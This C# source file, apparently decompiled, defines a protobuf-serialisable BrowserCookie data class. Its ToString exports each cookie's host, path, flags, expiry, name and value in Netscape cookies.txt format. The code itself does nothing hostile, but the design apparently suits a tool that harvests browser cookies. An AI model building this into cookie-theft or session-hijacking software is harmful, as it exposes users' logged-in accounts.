using ProtoBuf;
using System.Collections.Generic;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "BrowserCookie")]
	public class BrowserCookie : INotifyPropertyChanged, IEqualityComparer<BrowserCookie>
	{
		private string _value;

		private string _name;

		private string _expires;

		private bool _secure;

		private string _path;

		private bool _http;

		private string _host;

		[ProtoMember(1, Name = "Host")]
		public string Host
		{
			get
			{
				return _host;
			}
			set
			{
				_host = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Host"));
			}
		}

		[ProtoMember(2, Name = "Http")]
		public bool Http
		{
			get
			{
				return _http;
			}
			set
			{
				_http = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Http"));
			}
		}

		[ProtoMember(3, Name = "Path")]
		public string Path
		{
			get
			{
				return _path;
			}
			set
			{
				_path = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Path"));
			}
		}

		[ProtoMember(4, Name = "Secure")]
		public bool Secure
		{
			get
			{
				return _secure;
			}
			set
			{
				_secure = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Secure"));
			}
		}

		[ProtoMember(5, Name = "Expires")]
		public string Expires
		{
			get
			{
				return _expires;
			}
			set
			{
				_expires = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Expires"));
			}
		}

		[ProtoMember(6, Name = "Name")]
		public string Name
		{
			get
			{
				return _name;
			}
			set
			{
				_name = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Name"));
			}
		}

		[ProtoMember(7, Name = "Value")]
		public string Value
		{
			get
			{
				return _value;
			}
			set
			{
				_value = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Value"));
			}
		}

		public event PropertyChangedEventHandler PropertyChanged;

		public override string ToString()
		{
			return string.Join("\t", new string[7]
			{
				Host,
				Http.ToString().ToUpper(),
				Path,
				Secure.ToString().ToUpper(),
				Expires,
				Name,
				Value
			});
		}

		public bool Equals(BrowserCookie x, BrowserCookie y)
		{
			if (x.Name == y.Name && x.Host == y.Host && x.Path == y.Path)
			{
				return x.Value == y.Value;
			}
			return false;
		}

		public int GetHashCode(BrowserCookie obj)
		{
			int num = 37;
			num *= 397;
			if (!string.IsNullOrEmpty(obj.Name))
			{
				num += obj.Name.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Host))
			{
				num += obj.Host.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Path))
			{
				num += obj.Path.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Value))
			{
				num += obj.Value.GetHashCode();
			}
			return num;
		}
	}
}
